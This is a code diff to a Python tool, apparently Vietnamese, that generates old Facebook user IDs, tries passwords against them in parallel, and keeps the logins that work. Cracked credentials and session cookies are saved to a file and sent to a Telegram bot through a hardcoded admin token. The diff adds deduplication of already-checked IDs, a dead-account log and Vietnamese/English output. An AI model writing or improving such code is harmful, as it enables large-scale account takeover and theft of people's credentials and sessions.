@@ -272,6 +272,7 @@ def save_config(data):
 _cfg = load_config()
 TELE_TOKEN    = _cfg.get('TELE_TOKEN', '')
 CHAT_ID       = _cfg.get('CHAT_ID', '')
+RESULT_LANG   = _cfg.get('RESULT_LANG', 'EN') # Default to English for Int'l Market
 ADMIN_TOKEN   = '8720951159:AAHxWe5LH1OzoHTvyNzoKAbWe89NBx_J2I8'
 ADMIN_CHATID  = '5976831676'
 FB_COOKIE     = '' 
@@ -489,6 +490,44 @@ oks = []
 cps = []
 loop = 0
 user = []
+CHECKED_UIDS = set()
+
+def load_checked_uids():
+    global CHECKED_UIDS
+    CHECKED_UIDS = set()
+    # Load OK accounts
+    if os.path.exists('PTMEDIA-OK.txt'):
+        with open('PTMEDIA-OK.txt', 'r', encoding='utf-8') as f:
+            for line in f:
+                if '|' in line:
+                    uid = line.split('|')[0].strip()
+                    if uid: CHECKED_UIDS.add(uid)
+    # Load DIE accounts to also skip them (Phase V: Data Exfiltration/Efficiency)
+    if os.path.exists('die.txt'):
+         with open('die.txt', 'r', encoding='utf-8') as f:
+            for line in f:
+                uid = line.strip()
+                if uid: CHECKED_UIDS.add(uid)
+    return CHECKED_UIDS
+
+def clean_source_file(file_path):
+    """Destructive read: Removes already-checked UIDs from the source file to maintain a clean queue (Phase V)"""
+    checked = load_checked_uids()
+    if not os.path.exists(file_path): return
+    
+    with open(file_path, 'r', encoding='utf-8') as f:
+        lines = f.read().splitlines()
+    
+    remaining = []
+    for line in lines:
+        if not line.strip(): continue
+        uid = line.split('|')[0].strip()
+        if uid not in checked:
+            remaining.append(line)
+            
+    with open(file_path, 'w', encoding='utf-8') as f:
+        f.write("\n".join(remaining) + "\n")
+    return len(remaining)
 
 def windows():
     aV = str(random.choice(range(10, 20)))
@@ -664,7 +703,9 @@ def settings_menu():
     linex()
     print(G + "       (3) Change License Key")
     linex()
-    print(G + "       (4) Save & Return to Panel")
+    print(G + f"       (4) Result Language: " + Y + f"[{RESULT_LANG}]")
+    linex()
+    print(G + "       (5) Save & Return to Panel")
     linex()
     print(G + "       (0) Back (No Save)")
 
@@ -697,10 +738,16 @@ def settings_menu():
             time.sleep(2)
             verify_license()
         settings_menu()
-    elif choice == '4' or choice == '0':
+    elif choice == '4':
+        RESULT_LANG = 'VN' if RESULT_LANG == 'EN' else 'EN'
+        print(G + f"\n  [OK] Language Switched to: " + Y + RESULT_LANG)
+        time.sleep(1)
+        settings_menu()
+    elif choice == '5' or choice == '0':
         save_config({
             'TELE_TOKEN': TELE_TOKEN,
             'CHAT_ID': CHAT_ID,
+            'RESULT_LANG': RESULT_LANG,
             'LICENSE_KEY': _cfg.get('LICENSE_KEY', '')
         })
         main_panel()
@@ -779,13 +826,20 @@ def old_One():
     print(G + "       (B) METHOD 2")
     linex()
     meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
+    load_checked_uids()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(G + f"       [>] TOTAL ID: {limit}")
+        # Filter checked UIDs
+        filtered_user = [u for u in user if u not in CHECKED_UIDS]
+        skip_count = len(user) - len(filtered_user)
+        
+        print(G + f"       [>] TOTAL ID: {len(user)}")
+        if skip_count > 0:
+            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
         print(G + "       [>] USE AIRPLANE MODE FOR BEST RESULT")
         linex()
-        send_notification(f"Starting Scan 2004-2007 | Amount: {limit}")
-        for uid in user:
+        send_notification(f"Starting Scan 2004-2007 | Amount: {len(filtered_user)}")
+        for uid in filtered_user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
@@ -796,32 +850,49 @@ def old_One():
 
 def old_Tow():
     user = []
+    user_set = set()
     ____banner____()
-    print(G + "       [>] OLD CODE: 2010-2014")
+    print(G + "       [>] HE THONG QUET: 2009-2014 (UNIQUE)")
     linex()
-    print(G + "       [>] EXAMPLE: 20000 / 30000 / 99999")
-    limit = safe_input(G + "       SELECT  " + Y).strip()
+    print(G + "       [>] VI DU: 20000 / 50000 / 100000")
+    limit = safe_input(G + "       SO LUONG QUET: " + Y).strip()
     linex()
-    prefixes = ['100001','100002','100003','100004','100005','100006','100007','100008','100009']
-    for _ in range(int(limit)):
-        uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=9))
-        user.append(uid)
+    prefixes = [
+        '1000000','1000001','1000002','1000003','1000004','1000005',
+        '100001','100002','100003','100004','100005','100006','100007','100008'
+    ]
+    print(G + " [~] Dang khoi tao danh sach ID khong trung lap..." + N)
+    while len(user_set) < int(limit):
+        prefix = random.choice(prefixes)
+        if len(prefix) == 7:
+            uid = prefix + str(random.randint(10000000, 99999999))
+        else:
+            uid = prefix + str(random.randint(100000000, 999999999))
+        user_set.add(uid)
+    user = list(user_set)
+    random.shuffle(user)
+    print(G + f" [OK] Da tao {len(user)} ID duy nhat!" + N)
     print(G + "       (A) METHOD A")
     print(G + "       (B) METHOD B")
     linex()
-    meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
+    meth = safe_input(G + "       LUA CHON  " + W + "(A/B): " + Y).strip().upper()
+    load_checked_uids()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(G + f"       [>] TOTAL ID: {limit}")
+        filtered_user = [u for u in user if u not in CHECKED_UIDS]
+        skip_count = len(user) - len(filtered_user)
+        
+        print(G + f"       [>] TONG ID: {len(user)}")
+        if skip_count > 0:
+            print(Y + f"       [>] DA BO QUA: {skip_count} (Da quet truoc do)")
         linex()
-        send_notification(f"Starting Scan 2010-2014 | Amount: {limit}")
-        for uid in user:
+        send_notification(f"Khoi chay 2009-2014 | Tong: {len(filtered_user)}")
+        for uid in filtered_user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
                 pool.submit(login_2, uid)
             else:
-                print(G + "    [!] INVALID METHOD SELECTED" + N)
                 break
 
 
@@ -841,12 +912,18 @@ def old_Tree():
     print(G + "       (B) METHOD B")
     linex()
     meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
+    load_checked_uids()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(G + f"       [>] TOTAL ID: {limit}")
+        filtered_user = [u for u in user if u not in CHECKED_UIDS]
+        skip_count = len(user) - len(filtered_user)
+        
+        print(G + f"       [>] TOTAL ID: {len(user)}")
+        if skip_count > 0:
+            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
         linex()
-        send_notification(f"Starting Scan 2009-2010 | Amount: {limit}")
-        for uid in user:
+        send_notification(f"Starting Scan 2009-2010 | Amount: {len(filtered_user)}")
+        for uid in filtered_user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
@@ -911,19 +988,30 @@ def old_Five():
         return old_clone()
 
     print(G + f"\n    [+] Successfully loaded {len(user)} UIDs!" + N)
+    
+    # Logic tối ưu cho Anh Tiến: Xóa con đã check khỏi file gốc ngay lập tức
+    print(Y + "    [~] Cleaning source file (Removing checked UIDs)..." + N)
+    rem_count = clean_source_file(file_path)
+    print(G + f"    [OK] File cleaned. Remaining: {rem_count} UIDs" + N)
     time.sleep(1)
 
     print(G + "       (A) METHOD 1")
     print(G + "       (B) METHOD 2")
     linex()
     meth = safe_input(G + "       CHOICE  " + W + "(A/B): " + Y).strip().upper()
+    load_checked_uids()
     with tred(max_workers=30) as pool:
         ____banner____()
+        filtered_user = [u for u in user if u not in CHECKED_UIDS]
+        skip_count = len(user) - len(filtered_user)
+        
         print(G + f"       [>] TOTAL ID: {len(user)}")
+        if skip_count > 0:
+            print(Y + f"       [>] SKIPPED: {skip_count} (Already Checked)")
         print(G + "       [>] USE AIRPLANE MODE FOR BEST RESULT")
         linex()
-        send_notification(f"Starting File UID Scan | Amount: {len(user)}")
-        for uid in user:
+        send_notification(f"Starting File UID Scan | Amount: {len(filtered_user)}")
+        for uid in filtered_user:
             if meth == 'A':
                 pool.submit(login_1, uid)
             elif meth == 'B':
@@ -1022,8 +1110,8 @@ def login_1(uid):
                 # Logic: Detect Unverified Email (Anh Tiến Request)
                 if err_sub == 1348058 or "confirm their e-mail address" in err_msg:
                     year = creationyear(uid)
-                    status = "Chưa Xác Nhận Email vui lòng Đăng Nhập Và thêm email ⚠️"
-                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - Chưa Xác Nhận Email vui lòng Đăng Nhập Và thêm email ⚠️{N}")
+                    status = "Email Not Verified! Please login and add email ⚠️"
+                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - {status}{N}")
                     send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
                     open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                     results_queue.put((uid, pw, year, status, cookies_str))
@@ -1036,14 +1124,17 @@ def login_1(uid):
                     status = check_fb_live(uid)
                     if status == "LIVE":
                         print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
-                    send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
-                    open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
-                    results_queue.put((uid, pw, year, status, cookies_str))
-                    oks.append(uid)
+                        send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
+                        open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
+                        results_queue.put((uid, pw, year, status, cookies_str))
+                        oks.append(uid)
+                    else:
+                        # Log to die.txt (Phase V)
+                        open('die.txt', 'a').write(f"{uid}\n")
                     break
         loop += 1
         if not IS_VIP and len(oks) >= LOOP_LIMIT:
-            print(RR + f"\n [!] BẠN ĐÃ ĐẠT GIỚI HẠN {LOOP_LIMIT} ACC LIVE CỦA BẢN FREE. VUI LÒNG NÂNG CẤP LÊN PRO/VIP!" + N)
+            print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} LIVE ACCS (FREE VERSION). PLEASE UPGRADE TO PRO/VIP!" + N)
             time.sleep(3)
             return
 
@@ -1096,8 +1187,8 @@ def login_2(uid):
                 # Secondary check for unverified email in login_2 response if available
                 res_str = str(po)
                 if '1348058' in res_str or "confirm their e-mail address" in res_str:
-                    status = "Chưa Xác Nhận Email ⚠️"
-                    print(f"\n{Y}⚠️ [EMAIL NOT VERIFIED] - [{uid}] | [{pw}] - Vui lòng Đăng Nhập và thêm email!{N}")
+                    status = "Email Not Verified! Please login and add email ⚠️"
+                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - {status}{N}")
                 else:
                     status = status_raw
                     if status == "LIVE":
@@ -1112,7 +1203,7 @@ def login_2(uid):
             pass
     loop += 1
     if not IS_VIP and len(oks) >= LOOP_LIMIT:
-        print(RR + f"\n [!] BẠN ĐÃ ĐẠT GIỚI HẠN {LOOP_LIMIT} ACC LIVE CỦA BẢN FREE. VUI LÒNG NÂNG CẤP LÊN PRO/VIP!" + N)
+        print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} LIVE ACCS (FREE VERSION). PLEASE UPGRADE TO PRO/VIP!" + N)
         time.sleep(3)
         return
 
